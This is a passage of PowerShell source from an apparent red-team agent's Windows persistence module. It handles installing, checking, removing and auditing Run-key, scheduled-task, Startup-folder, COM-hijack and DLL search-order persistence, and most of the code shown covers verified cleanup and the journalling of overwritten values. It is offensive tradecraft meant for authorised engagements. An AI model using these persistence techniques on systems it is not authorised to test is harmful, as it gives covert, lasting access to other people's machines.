      $ev.note = 'manifest says installed but the artifacts are GONE - removed outside a verified remove op (out-of-band). Absence is measured now; the removal itself was never channel-verified.'
    } else {
      $ev.state = 'absent'
      $ev.note = 'not installed (no manifest entry; trigger location and plant paths clean at live re-read)'
    }
  } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
  return $ev
}

# Deep removal: execute, then VERIFY - identical doctrine. comhijack: the classic dance
# against the hijacked value (a journaled foreign value is RESTORED; a shadow install
# un-shadows by deletion - HKLM is never touched). dllsearch: disarm the TRIGGER FIRST,
# then delete ONLY hash-matching plants (foreign bytes = loud refused-foreign), then
# the plant dir; removalVerified = trigger verified AND every planted file verified.
function Remove-VvDeepTechOne([string]$Key, [string]$Tech, [string]$Name, $Deep, $Manifest, [string]$ManifestPath) {
  $entry = $Manifest.entries[$Key]
  if ($null -eq $Deep -and $null -ne $entry -and $null -ne $entry.deep) { $Deep = $entry.deep }
  if ($null -eq $Deep) {
    return [ordered]@{
      state = 'removed'; technique = $Tech; entryKey = $Key; location = $null; target = $null; targetSha256 = $null
      preExisted = $false; overwriteJournaled = $false; installVerified = $null; removalVerified = $true; journalRestored = $null
      triggerModel = (Get-VvPersistTriggerModel $Tech)
      note = $(if ($null -ne $entry) { 'manifest entry carries no deep params - nothing locatable to remove; reported honestly' } else { 'nothing installed (no manifest entry, no params) - verified clean of anything this agent recorded' })
      error = $null
    }
  }
  if ($Tech -eq 'comhijack') {
    $clsid = ([string]$Deep.clsid).ToUpper()
    $dll = [string]$Deep.dll
    $ev = New-VvDeepEv 'comhijack' $Key ('HKCU\Software\Classes\CLSID\' + $clsid + '\InprocServer32') $dll $Deep
    try {
      if ($null -ne $entry -and $null -ne $entry.deep) { $ev.classification = [string]$entry.deep.classification; $ev.shadow = ($entry.deep.shadow -eq $true); $ev.dllSha256 = [string]$entry.deep.dllSha256 }
      if ($null -ne $entry) { $ev.preExisted = ($entry.preInstall.present -eq $true) }
      if ($null -ne $entry -and $entry.overwriteJournaled -eq $true -and $null -ne $entry.preInstall.value) {
        $ev.overwriteJournaled = $true
        Apply-VvComHijack $clsid ([string]$entry.preInstall.value)
        $post = Probe-VvComRegistration 'HKCU' $clsid
        $ev.journalRestored = ($post.Present -and ([string]$post.Value) -eq ([string]$entry.preInstall.value))
        $ev.removalVerified = $ev.journalRestored
        if (-not $ev.journalRestored) {
          $ev.state = 'removal-failed'; $entry.state = 'removal-failed'; $entry.removalVerified = $false
          $ev.error = 'journal restore did NOT verify (re-read != the journaled pre-install value) - the InprocServer32 does NOT hold what it held before install (LOUD; escalate to the operator)'
          return $ev
        }
        $ev.state = 'removed'
        $ev.note = 'the journaled pre-install value was restored and re-verified - the InprocServer32 provably holds what it held before install'
        $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o')
        return $ev
      }
      $cur = Probe-VvComRegistration 'HKCU' $clsid
      if ($cur.Present) {
        $claimed = ($null -ne $entry) -or (([string]$cur.Value) -eq $dll)
        if (-not $claimed) {
          $ev.state = 'refused-foreign'
          $ev.note = 'the InprocServer32 holds a value this agent NEVER installed (no manifest entry, value mismatch) - REFUSED to remove what we did not write'
          return $ev
        }
        $containerPreExisted = ($null -ne $entry -and $null -ne $entry.deep -and $entry.deep.containerPresent -eq $true)
        Clear-VvComHijack $clsid $containerPreExisted
        $post = Probe-VvComRegistration 'HKCU' $clsid
        $ev.removalVerified = (-not $post.Present)
        if (-not $ev.removalVerified) {
          $ev.state = 'removal-failed'
          if ($null -ne $entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
          $ev.error = 'remove executed but the hijack is STILL PRESENT on re-read - CLEANUP-PROOF FAILED (loud, escalated to the operator; the engagement cannot be called clean)'
          return $ev
        }
        $ev.state = 'removed'
        $ev.note = $(if ($ev.shadow) { 'hijack deleted and verified absent - the HKLM registration is UN-SHADOWED (it was never touched); the class resolves machine-wide again' } else { 'hijack deleted and verified absent - the per-user registration is gone; the CLSID resolves exactly as it did pre-install' })
        if ($null -ne $entry) { $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o') }
        return $ev
      }
      $ev.state = 'removed'; $ev.removalVerified = $true
      $ev.note = $(if ($null -ne $entry) { 'already absent at remove time - absence re-verified now' } else { 'nothing installed (no manifest entry) - the location is verified clean' })
      if ($null -ne $entry) { $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o') }
      return $ev
    } catch {
      $ev.state = 'removal-failed'
      if ($null -ne $entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
      $ev.error = [string]$_.Exception.Message + ' - removal UNVERIFIED (LOUD; escalate)'
      return $ev
    }
  }
  # dllsearch removal
  $targetLine = $(if ($Deep.trigger -and $Deep.trigger.value) { [string]$Deep.trigger.value } else { $null })
  $triggerTech = $(if ($Deep.trigger -and $Deep.trigger.technique) { ([string]$Deep.trigger.technique).ToLower() } else { 'runkey' })
  $trigLoc = Get-VvPersistLoc $triggerTech $Name
  $ev = New-VvDeepEv 'dllsearch' $Key $trigLoc.Location $targetLine $Deep
  try {
    $plantDir = $(if ($Deep.plantDir) { [string]$Deep.plantDir } else { Join-Path (Split-Path $ManifestPath -Parent) ('persist-dllsearch-' + $Name) })
    $ev.plantDir = $plantDir
    $ev.trigger = @{ technique = $triggerTech; location = $trigLoc.Location }
    if (-not $targetLine) { $targetLine = '"' + (Join-Path $plantDir (Split-Path ([string]$Deep.host) -Leaf)) + '"'; $ev.target = $targetLine; $ev.targetSha256 = Get-VvPersistSha256Hex $targetLine }
    if ($null -ne $entry -and $null -ne $entry.deep) { $ev.dllSha256 = [string]$entry.deep.dllSha256; $ev.hostSha256 = [string]$entry.deep.hostSha256 }
    if ($null -ne $entry) { $ev.preExisted = ($entry.preInstall.present -eq $true) }
    # 1. DISARM THE TRIGGER FIRST (journaled restore, or delete + verify).
    if ($null -ne $entry -and $entry.overwriteJournaled -eq $true -and $null -ne $entry.preInstall.value) {
      $ev.overwriteJournaled = $true
      Apply-VvPersistTech $trigLoc ([string]$entry.preInstall.value)
      $post = Probe-VvPersistTech $trigLoc
      $ev.journalRestored = ($post.Present -and ((ConvertTo-VvCanonicalTarget ([string]$post.Value)) -eq (ConvertTo-VvCanonicalTarget ([string]$entry.preInstall.value))))
      if (-not $ev.journalRestored) {
        $ev.state = 'removal-failed'; $entry.state = 'removal-failed'; $entry.removalVerified = $false
        $ev.error = 'trigger journal restore did NOT verify - the trigger location does NOT hold what it held before install (LOUD; escalate)'
        return $ev
      }
    } else {
      $cur = Probe-VvPersistTech $trigLoc
      if ($cur.Present) {
        $claimed = ($null -ne $entry) -or ((ConvertTo-VvCanonicalTarget ([string]$cur.Value)) -eq (ConvertTo-VvCanonicalTarget $targetLine))
        if (-not $claimed) {
          $ev.state = 'refused-foreign'
          $ev.note = 'the trigger location holds a value this agent NEVER installed (no manifest entry, value mismatch) - REFUSED to remove what we did not write; the plant files (if any) stay journaled'
          return $ev
        }
        Clear-VvPersistTech $trigLoc
        $post = Probe-VvPersistTech $trigLoc
        if ($post.Present) {
          $ev.state = 'removal-failed'
          if ($null -ne $entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
          $ev.error = 'trigger remove executed but the value is STILL PRESENT on re-read - CLEANUP-PROOF FAILED (loud, escalated; the persistence may STILL FIRE at next logon)'
          return $ev
        }
      }
    }
    # 2. THE PLANTS - delete ONLY files whose live hash still matches what we planted.
    $recorded = @()
    if ($null -ne $entry -and $null -ne $entry.deep -and $null -ne $entry.deep.files) { $recorded = @($entry.deep.files | Where-Object { $_.planted -eq $true }) }
    foreach ($f in $recorded) {
      $rec = [ordered]@{ role = [string]$f.role; path = [string]$f.path; sha256 = $null; present = $false; planted = $true; removalVerified = $null }
      $preF = Probe-VvPersistFile ([string]$f.path)
      if ($preF.Present -and $preF.Sha256 -ne ([string]$f.sha256)) {
        $rec.present = $true; $rec.sha256 = $preF.Sha256
        $ev.files = @($ev.files) + $rec
        $ev.state = 'refused-foreign'
        $ev.error = 'plant file now holds FOREIGN bytes (hash changed since plant): ' + [string]$f.path + ' - REFUSED to delete what we did not write (LOUD; escalate to the operator)'
        return $ev
      }
      if ($preF.Present) {
        try { Remove-Item -LiteralPath ([string]$f.path) -Force -ErrorAction Stop } catch {
          $rec.present = $true; $rec.sha256 = $preF.Sha256
          $ev.files = @($ev.files) + $rec
          $ev.state = 'removal-failed'
          if ($null -ne $entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
          $ev.error = 'remove failed for ' + [string]$f.path + ': ' + [string]$_.Exception.Message + ' - removal UNVERIFIED (LOUD; escalate; a still-running copied host holds its files locked - kill it first)'
          return $ev
        }
      }
      $postF = Probe-VvPersistFile ([string]$f.path)
      $rec.removalVerified = (-not $postF.Present)
      $rec.present = $postF.Present
      $ev.files = @($ev.files) + $rec
      if (-not $rec.removalVerified) {
        $ev.state = 'removal-failed'
        if ($null -ne $entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
        $ev.error = 'remove executed but ' + [string]$f.path + ' is STILL PRESENT on re-read - CLEANUP-PROOF FAILED (loud, escalated to the operator; the engagement cannot be called clean)'
        return $ev
      }
    }
    # 3. the plant dir itself goes last (best-effort; a lingering empty dir is reported
    #    by status, never hidden).
    try { if (Test-Path -LiteralPath $plantDir) { Remove-Item -LiteralPath $plantDir -Recurse -Force -ErrorAction Stop } } catch {}
    $ev.removalVerified = $true
    $ev.state = 'removed'
    $ev.note = $(if ($ev.overwriteJournaled) { 'the journaled pre-install trigger value was restored and re-verified; ' } else { 'the trigger was deleted and verified absent; ' }) + 'every planted file was deleted and re-read absent - the plant provably holds nothing of ours'
    if ($null -ne $entry) { $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o') }
    return $ev
  } catch {
    $ev.state = 'removal-failed'
    if ($null -ne $entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
    $ev.error = [string]$_.Exception.Message + ' - removal UNVERIFIED (LOUD; escalate)'
    return $ev
  }
}

# The deep half of the engagement sweep: re-probe ONE manifest entry's recorded
# artifact set LIVE (comhijack: the InprocServer32 value; dllsearch: the trigger value
# + every planted file). Verified === true ONLY with every artifact measured absent.
function Probe-VvDeepEntryPresence($Entry, [string]$Tag) {
  if ($Entry.technique -eq 'comhijack') {
    $cur = $null
    try { $cur = Probe-VvComRegistration 'HKCU' ([string]$Entry.deep.clsid) } catch { $cur = $null }
    if ($null -ne $cur -and $cur.Present) {
      $st = $(if ($Entry.state -eq 'removal-failed') { 'removal-failed' } elseif (([string]$cur.Value) -eq ([string]$Entry.deep.dll)) { 'installed' } else { 'tampered' })
      return @{ State = $st; Verified = $false; Note = 'STILL PRESENT at the sweep - unverified persistence; the engagement is NOT clean' }
    }
    if ($null -ne $cur -and -not $cur.Present) {
      return @{ State = 'absent'; Verified = $true; Note = 'live-verified absent at sweep (measured now, not remembered)' }
    }
    return @{ State = $(if ($Entry.state -eq 'removal-failed') { 'removal-failed' } else { 'unknown' }); Verified = $false; Note = 'sweep probe failed - removal UNVERIFIED (treated as open: never assume absence)' }
  }
  $anyPresent = $false; $probeFailed = $false
  $trigTech = $(if ($Entry.deep.trigger -and $Entry.deep.trigger.technique) { ([string]$Entry.deep.trigger.technique).ToLower() } else { 'runkey' })
  try { $trig = Probe-VvPersistTech (Get-VvPersistLoc $trigTech $Tag); if ($trig.Present) { $anyPresent = $true } } catch { $probeFailed = $true }
  if ($null -ne $Entry.deep.files) {
    foreach ($f in @($Entry.deep.files | Where-Object { $_.planted -eq $true })) {
      try { $curF = Probe-VvPersistFile ([string]$f.path); if ($curF.Present) { $anyPresent = $true } } catch { $probeFailed = $true }
    }
  }
  if ($anyPresent) { return @{ State = $(if ($Entry.state -eq 'removal-failed') { 'removal-failed' } else { 'installed' }); Verified = $false; Note = 'STILL PRESENT at the sweep (trigger value and/or planted files) - unverified persistence; the engagement is NOT clean' } }
  if ($probeFailed) { return @{ State = $(if ($Entry.state -eq 'removal-failed') { 'removal-failed' } else { 'unknown' }); Verified = $false; Note = 'a sweep probe failed - removal UNVERIFIED (treated as open: never assume absence)' } }
  return @{ State = 'absent'; Verified = $true; Note = 'live-verified absent at sweep (trigger + every planted file measured absent now, not remembered)' }
}

# --- The removal manifest (the accountability record that outlives this process) ---
function Read-VvPersistManifest([string]$Path, [string]$Name, [string]$Target) {
  if ($Path -and (Test-Path -LiteralPath $Path)) {
    try {
      $j = Get-Content -LiteralPath $Path -Raw -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop
      $m = @{ version = 1; tag = $(if ($j.tag) { [string]$j.tag } else { $null }); target = $(if ($j.target) { [string]$j.target } else { $null }); targetSha256 = $(if ($j.targetSha256) { [string]$j.targetSha256 } else { $null }); createdAt = $(if ($j.createdAt) { [string]$j.createdAt } else { [DateTime]::UtcNow.ToString('o') }); entries = @{} }
      if ($j.entries) {
        foreach ($prop in $j.entries.PSObject.Properties) {
          $e = $prop.Value
          $m.entries[$prop.Name] = @{
            technique = [string]$e.technique; location = [string]$e.location; targetSha256 = [string]$e.targetSha256
            deep = $(if ($null -ne $e.deep) { $e.deep } else { $null }) # deep params journal (clsid/dll/plant set) - pass-through, re-serialized at write
            preInstall = @{ present = ($e.preInstall.present -eq $true); value = $(if ($null -ne $e.preInstall.value) { [string]$e.preInstall.value } else { $null }); valueSha256 = $(if ($e.preInstall.valueSha256) { [string]$e.preInstall.valueSha256 } else { $null }) }
            overwriteJournaled = ($e.overwriteJournaled -eq $true)
            state = [string]$e.state; installedAt = [string]$e.installedAt
            removedAt = $(if ($e.removedAt) { [string]$e.removedAt } else { $null })
            removalVerified = $(if ($null -ne $e.removalVerified) { $e.removalVerified -eq $true } else { $null })
          }
        }
      }
      return $m
    } catch { } # a corrupt/unreadable manifest falls through to a fresh one - the op notes it
  }
  return @{ version = 1; tag = $(if ($Name) { $Name } else { $null }); target = $(if ($Target) { $Target } else { $null }); targetSha256 = $(if ($Target) { Get-VvPersistSha256Hex $Target } else { $null }); createdAt = [DateTime]::UtcNow.ToString('o'); entries = @{} }
}

function Write-VvPersistManifest([string]$Path, $Manifest) {
  if (-not $Path) { return $false }
  try {
    $dir = Split-Path $Path -Parent
    if ($dir -and -not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
    ($Manifest | ConvertTo-Json -Depth 8 -Compress) | Set-Content -LiteralPath $Path -Encoding UTF8 -ErrorAction Stop
    return $true
  } catch { return $false }
}

function Save-VvPersistEntry($Manifest, [string]$Tech, $Ev, $PreInstall, [bool]$Journaled) {
  $prev = $Manifest.entries[$Tech]
  $Manifest.entries[$Tech] = @{
    technique = $Tech; location = $Ev.location; targetSha256 = $Ev.targetSha256
    preInstall = $PreInstall
    overwriteJournaled = $Journaled
    # honest state: an install whose write did NOT verify is recorded as 'failed' (the
    # entry exists so remove can still take it back - the sweep re-probes live)
    state = $(if ($Ev.state -eq 'installed') { 'installed' } else { 'failed' })
    installedAt = $(if ($prev -and $prev.installedAt) { [string]$prev.installedAt } else { [DateTime]::UtcNow.ToString('o') })
    removedAt = $null; removalVerified = $null
  }
}

function New-VvPersistEv([string]$Tech, $Loc, [string]$Target) {
  return [ordered]@{
    state = 'failed'; technique = $Tech; location = $Loc.Location
    target = $(if ($Target) { $Target } else { $null }); targetSha256 = $(if ($Target) { Get-VvPersistSha256Hex $Target } else { $null })
    preExisted = $false; overwriteJournaled = $false
    installVerified = $null; removalVerified = $null; journalRestored = $null
    note = $null; error = $null
  }
}

# install(): pre-install snapshot FIRST; a foreign value is never clobbered silently
# (refuse, or journal-then-replace when overwrite was passed); the write is PROVEN by
# re-read. Returns the per-technique evidence object.
function Install-VvPersistTechOne([string]$Tech, [string]$Name, [string]$Target, $Manifest, [bool]$Overwrite) {
  $loc = Get-VvPersistLoc $Tech $Name
  $ev = New-VvPersistEv $Tech $loc $Target
  $canon = ConvertTo-VvCanonicalTarget $Target
  try {
    $pre = Probe-VvPersistTech $loc
    $ev.preExisted = $pre.Present
    if ($pre.Present -and (ConvertTo-VvCanonicalTarget ([string]$pre.Value)) -eq $canon) {
      $ev.state = 'installed'; $ev.installVerified = $true
      $ev.note = 'already installed and intact (live re-read matches the target line) - idempotent no-op'
      Save-VvPersistEntry $Manifest $Tech $ev @{ present = $true; value = $null; valueSha256 = $null } $false
      return $ev
    }
    if ($pre.Present -and -not $Overwrite) {
      $ev.state = 'refused-clobber'
      $ev.note = 'location already holds a FOREIGN value (sha256 ' + (Get-VvPersistSha256Hex ([string]$pre.Value)).Substring(0, 12) + '...) - REFUSED to clobber it silently. Re-task with overwrite:true to journal the old value and replace it; the journal restores it on remove.'
      return $ev
    }
    if ($pre.Present) { $ev.overwriteJournaled = $true }
    Apply-VvPersistTech $loc $Target
    $post = Probe-VvPersistTech $loc
    $ev.installVerified = ($post.Present -and (ConvertTo-VvCanonicalTarget ([string]$post.Value)) -eq $canon)
    if (-not $ev.installVerified) {
      $ev.state = 'failed'
      $ev.error = 'install write did NOT verify (re-read mismatch - the location does not hold the target line). Nothing claimed; remove will still take this entry back.'
    } else {
      $ev.state = 'installed'
    }
    Save-VvPersistEntry $Manifest $Tech $ev @{ present = $pre.Present; value = $(if ($ev.overwriteJournaled) { [string]$pre.Value } else { $null }); valueSha256 = $(if ($pre.Present) { Get-VvPersistSha256Hex ([string]$pre.Value) } else { $null }) } $ev.overwriteJournaled
  } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
  return $ev
}

# status(): LIVE re-read - present + intact + pointing at the right target line,
# measured now, never remembered.
function Get-VvPersistStatusOne([string]$Tech, [string]$Name, $Manifest, [string]$Target) {
  $loc = Get-VvPersistLoc $Tech $Name
  $ev = New-VvPersistEv $Tech $loc $Target
  $entry = $Manifest.entries[$Tech]
  try {
    $cur = Probe-VvPersistTech $loc
    $canon = $(if ($Target) { ConvertTo-VvCanonicalTarget $Target } else { $null })
    if ($entry) { $ev.preExisted = ($entry.preInstall.present -eq $true) }
    if ($cur.Present -and $canon -and (ConvertTo-VvCanonicalTarget ([string]$cur.Value)) -eq $canon) {
      $ev.state = 'installed'; $ev.installVerified = $true
      $ev.note = $(if ($entry) { 'present and intact (live re-read matches the target line)' } else { 'present and intact (value-identified as ours; no manifest entry)' })
    } elseif ($cur.Present) {
      if ($entry -and $entry.state -eq 'installed') {
        $ev.state = 'tampered'
        $ev.note = 'the location holds a DIFFERENT value than this agent installed (sha256 ' + (Get-VvPersistSha256Hex ([string]$cur.Value)).Substring(0, 12) + '...) - changed since install; reporting honestly'
      } else {
        $ev.state = 'foreign-present'
        $ev.note = 'the location holds a value this agent never installed - not ours, never claimed'
      }
    } elseif ($entry -and $entry.removalVerified -eq $true) {
      $ev.state = 'removed'; $ev.removalVerified = $true
      $ev.note = 'verified absent (removal was proven at ' + $(if ($entry.removedAt) { [string]$entry.removedAt } else { 'remove time' }) + '; still absent at this live re-read)'
    } elseif ($entry -and $entry.state -eq 'installed') {
      $ev.state = 'missing'
      $ev.note = 'manifest says installed but the location is GONE - removed outside a verified remove op (out-of-band). Absence is measured now; the removal itself was never channel-verified.'
    } else {
      $ev.state = 'absent'
      $ev.note = 'not installed (no manifest entry, location clean at live re-read)'
    }
  } catch { $ev.state = 'failed'; $ev.error = [string]$_.Exception.Message }
  return $ev
}

# remove(): execute, then VERIFY. A journaled pre-install value is RESTORED (not
# deleted) and re-verified. A removal whose re-read still shows the location present is
# 'removal-failed' - LOUD, escalated, and the entry STAYS in the manifest as an open
# loose end. A foreign value this agent never installed is REFUSED (we never delete
# what we did not write).
function Remove-VvPersistTechOne([string]$Tech, [string]$Name, $Manifest, [string]$Target) {
  $loc = Get-VvPersistLoc $Tech $Name
  $ev = New-VvPersistEv $Tech $loc $Target
  $entry = $Manifest.entries[$Tech]
  try {
    if ($entry) { $ev.preExisted = ($entry.preInstall.present -eq $true) }
    if ($entry -and $entry.overwriteJournaled -and $null -ne $entry.preInstall.value) {
      $ev.overwriteJournaled = $true
      Apply-VvPersistTech $loc ([string]$entry.preInstall.value)
      $post = Probe-VvPersistTech $loc
      $ev.journalRestored = ($post.Present -and (ConvertTo-VvCanonicalTarget ([string]$post.Value)) -eq (ConvertTo-VvCanonicalTarget ([string]$entry.preInstall.value)))
      $ev.removalVerified = $ev.journalRestored
      if (-not $ev.journalRestored) {
        $ev.state = 'removal-failed'; $entry.state = 'removal-failed'; $entry.removalVerified = $false
        $ev.error = 'journal restore did NOT verify (re-read != the journaled pre-install value) - the location does NOT hold what it held before install (LOUD; escalate to the operator)'
        return $ev
      }
      $ev.state = 'removed'
      $ev.note = 'the journaled pre-install value was restored and re-verified - the location provably holds what it held before install'
      $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o')
      return $ev
    }
    $cur = Probe-VvPersistTech $loc
    if ($cur.Present) {
      $canon = $(if ($Target) { ConvertTo-VvCanonicalTarget $Target } else { $null })
      $claimed = ($null -ne $entry) -or ($canon -and (ConvertTo-VvCanonicalTarget ([string]$cur.Value)) -eq $canon)
      if (-not $claimed) {
        $ev.state = 'refused-foreign'
        $ev.note = 'the location holds a value this agent NEVER installed (no manifest entry, value mismatch) - REFUSED to remove what we did not write'
        return $ev
      }
      Clear-VvPersistTech $loc
      $post = Probe-VvPersistTech $loc
      $ev.removalVerified = (-not $post.Present)
      if (-not $ev.removalVerified) {
        $ev.state = 'removal-failed'
        if ($entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
        $ev.error = 'remove executed but the location is STILL PRESENT on re-read - CLEANUP-PROOF FAILED (loud, escalated to the operator; the engagement cannot be called clean)'
        return $ev
      }
      $ev.state = 'removed'
      if ($entry) { $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o') }
      else { $ev.note = 'no manifest entry (value-identified as ours) - removed and verified absent' }
      return $ev
    }
    $ev.state = 'removed'; $ev.removalVerified = $true
    $ev.note = $(if ($entry) { 'already absent at remove time - absence re-verified now' } else { 'nothing installed (no manifest entry) - the location is verified clean' })
    if ($entry) { $entry.state = 'removed'; $entry.removalVerified = $true; $entry.removedAt = [DateTime]::UtcNow.ToString('o') }
    return $ev
  } catch {
    $ev.state = 'removal-failed'
    if ($entry) { $entry.state = 'removal-failed'; $entry.removalVerified = $false }
    $ev.error = [string]$_.Exception.Message + ' - removal UNVERIFIED (LOUD; escalate)'
    return $ev
  }
}

# The engagement sweep: every manifest entry re-probed LIVE (measured now, never
# remembered). clean === true ONLY with zero open entries - an engagement with
# unverified persistence is never clean.
function Invoke-VvPersistAudit($Manifest) {
  $entries = @()
  $open = @()
  foreach ($tech in @($Manifest.entries.Keys)) {
    $entry = $Manifest.entries[$tech]
    # Sweep rows report the BASE technique ('comhijack', not the per-CLSID manifest key
    # 'comhijack-9B1F4D2E') so engagement tracking keys consistently on
    # technique+location; the key handle rides as 'key' for deep entries. (Twin:
    # PersistStore.audit in engine/persist.mjs.)
    $rec = [ordered]@{ technique = $(if ($null -ne $entry.deep) { [string]$entry.technique } else { $tech }); location = [string]$entry.location; targetSha256 = [string]$entry.targetSha256; state = [string]$entry.state; removalVerified = ($entry.removalVerified -eq $true); installedAt = $entry.installedAt; removedAt = $entry.removedAt; note = $null }
    if ($null -ne $entry.deep) { $rec['key'] = $tech }
    if ($entry.state -eq 'removed' -and $entry.removalVerified -eq $true) { $entries += $rec; continue }
    if ($null -ne $entry.deep) {
      # DEEP sweep: re-probe the entry's recorded artifact set LIVE (the hijacked value;
      # the trigger + every planted file).
      $sweep = Probe-VvDeepEntryPresence $entry ([string]$Manifest.tag)
      $rec.state = $sweep.State; $rec.removalVerified = $sweep.Verified; $rec.note = $sweep.Note
      if ($sweep.Verified) {
        $entry.state = 'removed'; $entry.removalVerified = $true
        if (-not $entry.removedAt) { $entry.removedAt = [DateTime]::UtcNow.ToString('o') }
      } else { $open += $rec }
      $entries += $rec
      continue
    }
    $cur = $null
    try { $cur = Probe-VvPersistTech (Get-VvPersistLoc $tech ([string]$Manifest.tag)) } catch { $cur = $null }
    if ($null -ne $cur -and $cur.Present) {
      $isOurs = (-not $Manifest.target) -or ((ConvertTo-VvCanonicalTarget ([string]$cur.Value)) -eq (ConvertTo-VvCanonicalTarget ([string]$Manifest.target)))
      $rec.state = $(if ($entry.state -eq 'removal-failed') { 'removal-failed' } elseif ($isOurs) { 'installed' } else { 'tampered' })
      $rec.removalVerified = $false
      $rec.note = 'STILL PRESENT at the sweep - unverified persistence; the engagement is NOT clean'
      $open += $rec; $entries += $rec
    } elseif ($null -ne $cur -and -not $cur.Present) {
      $rec.state = 'absent'; $rec.removalVerified = $true
      $rec.note = 'live-verified absent at sweep (measured now, not remembered)'
      $entry.state = 'removed'; $entry.removalVerified = $true
      if (-not $entry.removedAt) { $entry.removedAt = [DateTime]::UtcNow.ToString('o') }
      $entries += $rec
    } else {
      $rec.state = $(if ($entry.state -eq 'removal-failed') { 'removal-failed' } else { 'unknown' })
      $rec.removalVerified = $false
      $rec.note = 'sweep probe failed - removal UNVERIFIED (treated as open: never assume absence)'
      $open += $rec; $entries += $rec
    }
  }
  $clean = ($open.Count -eq 0)
  $note = $(if ($clean) {
    if ($entries.Count -eq 0) { 'no persistence was ever installed by this agent (empty manifest) - clean' }
    else { 'every installed persistence is verified removed - the engagement persistence footprint is clean' }
  } else {
    ([string]$open.Count + ' technique(s) still present or removal-unverified - the engagement CANNOT be called clean; run persist-remove and re-audit')
  })
  return @{ clean = $clean; entries = $entries; open = $open; note = $note }
}

# Expand one named target into dispatch rows @{ key; tech; deep }: classic techniques
# map to one row keyed by name; a deep technique with explicit params maps to its
# per-CLSID/per-handle entry key; without params it expands to every recorded manifest
# entry of the technique (or the honest nothing-recorded row); a manifest entry KEY
# ('comhijack-<clsid8>') resolves through its recorded params.
function Expand-VvPersistTarget([string]$TargetName, $Deep, $Manifest, [string[]]$KnownClassic, [string[]]$KnownDeep) {
  if ($KnownClassic -contains $TargetName) { return @(@{ key = $TargetName; tech = $TargetName; deep = $null }) }
  if ($KnownDeep -contains $TargetName) {
    if ($null -ne $Deep) { return @(@{ key = (Get-VvDeepEntryKey $TargetName $Deep); tech = $TargetName; deep = $Deep }) }
    $rows = @()
    foreach ($k in @($Manifest.entries.Keys)) {
      $e = $Manifest.entries[$k]
      if ($e.technique -eq $TargetName -and $null -ne $e.deep) { $rows += @{ key = $k; tech = $TargetName; deep = $e.deep } }
    }
    if ($rows.Count -eq 0) { $rows = @(@{ key = $TargetName; tech = $TargetName; deep = $null }) }
    return $rows
  }
  $e = $Manifest.entries[$TargetName]
  if ($null -ne $e) {
    if ($null -ne $e.deep) { return @(@{ key = $TargetName; tech = [string]$e.technique; deep = $e.deep }) }
    if ($KnownClassic -contains ([string]$e.technique)) { return @(@{ key = $TargetName; tech = [string]$e.technique; deep = $null }) }
  }
  throw "unknown persist technique: $TargetName (the tier ships runkey, schtask, startup + deep comhijack, dllsearch - Windows user-land; no kernel, no SYSTEM services, no WMI subscriptions, no HKLM hives)"
}

# Dispatch one op into a result JSON string. $Op: install | status | remove | audit.
# $Deep: the deep-technique params (clsid+dll / host+as+dll+trigger). $Prove: run the
# benign resolve-proof on installed comhijack rows (status only).
function Invoke-VvPersistOp([string]$Op, [string[]]$Techniques, [string]$Name, [string]$Target, [bool]$Overwrite, [bool]$All, [string]$ManifestPath, $Deep = $null, [bool]$Prove = $false) {
  $knownClassic = @('runkey', 'schtask', 'startup')
  $knownDeep = @('comhijack', 'dllsearch')
  $known = $knownClassic + $knownDeep
  $manifest = Read-VvPersistManifest $ManifestPath $Name $Target
  # target resolution: the job's freshly captured line wins; the MANIFEST's recorded
  # line is the fallback (a relaunched agent may not rebuild the identical line - the
  # manifest is the source of truth for what was installed).
  if ((-not $Target -or $Target.Trim().Length -eq 0) -and $manifest.target) { $Target = [string]$manifest.target }
  # name resolution: explicit job name > manifest tag > target-derived tag
  if (-not $Name -or $Name.Trim().Length -eq 0) {
    if ($manifest.tag) { $Name = [string]$manifest.tag }
    elseif ($Target) { $Name = Get-VvPersistTag $Target }
    else { $Name = $null }
  }
  if ($Name -and -not (Test-VvPersistName $Name)) { throw "persist: name '$Name' is not a safe persistence handle (want ^[A-Za-z0-9][A-Za-z0-9_.-]{0,39}`$)" }
  if ($Name) { $manifest.tag = $Name }
  if ($Target) { $manifest.target = $Target; $manifest.targetSha256 = Get-VvPersistSha256Hex $Target }

  if ($Op -eq 'audit') {
    $sweep = Invoke-VvPersistAudit $manifest
    [void](Write-VvPersistManifest $ManifestPath $manifest)
    $aresult = [ordered]@{ op = 'audit'; pid = $PID; state = $(if ($sweep.clean) { 'clean' } else { 'unclean' }); clean = $sweep.clean; entries = $sweep.entries; open = $sweep.open; note = $sweep.note; at = [DateTime]::UtcNow.ToString('o') }
    return ($aresult | ConvertTo-Json -Compress -Depth 8)
  }

  if (-not $Name) { throw "persist-${Op}: no name handle resolvable (pass one explicitly, or install once so the manifest carries it)" }
  $techMap = [ordered]@{}
  $targets = @()
  if ($Op -eq 'install') {
    if ($null -eq $Techniques -or $Techniques.Count -eq 0) { throw 'persist-install: techniques is empty - nothing to do' }
    foreach ($t in $Techniques) { if ($known -notcontains $t) { throw "unknown persist technique: $t (the tier ships runkey, schtask, startup + deep comhijack, dllsearch - Windows user-land)" } }
    $deepTechs = @($Techniques | Where-Object { $knownDeep -contains $_ })
    if ($deepTechs.Count -gt 0) {
